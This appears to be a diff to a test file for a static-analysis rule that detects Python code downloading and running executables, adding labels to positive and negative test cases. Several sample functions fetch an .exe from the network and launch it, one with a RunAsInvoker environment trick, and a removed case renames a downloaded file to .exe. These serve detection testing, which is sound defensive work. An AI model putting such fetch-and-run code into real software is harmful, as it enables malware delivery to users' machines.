@@ -104,6 +104,8 @@ def f():
     urllib.request.urlretrieve("https://www.google.com/robots.txt", "robots.txt")
     os.rename("robots.txt", "roboto.txt")
 
+""" RULE ID: Downloads and creates an .exe
+"""
 def f():
     import os
     import requests
@@ -114,7 +116,8 @@ def f():
     open("exo.exe", "wb").write(response.content)
     os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
 
-
+""" OK: Downloads harmless file and references it
+"""
 def f():
     import os
     import requests
@@ -123,17 +126,7 @@ def f():
     response = requests.get(URL)
     # ok: download-executable
     open("exo.txt", "wb").write(response.content)
-    os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
-
-def f():
-    import os
-    import requests
-   
-    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
-    response = requests.get(URL)
-    # ok: download-executable
-    open("exo.txt", "wb").write(response.content)
-    os.system("mv exo.txt exo.exe")
+    os.system("echo exo.txt")
 
 def f():
     for executable in all_executables:
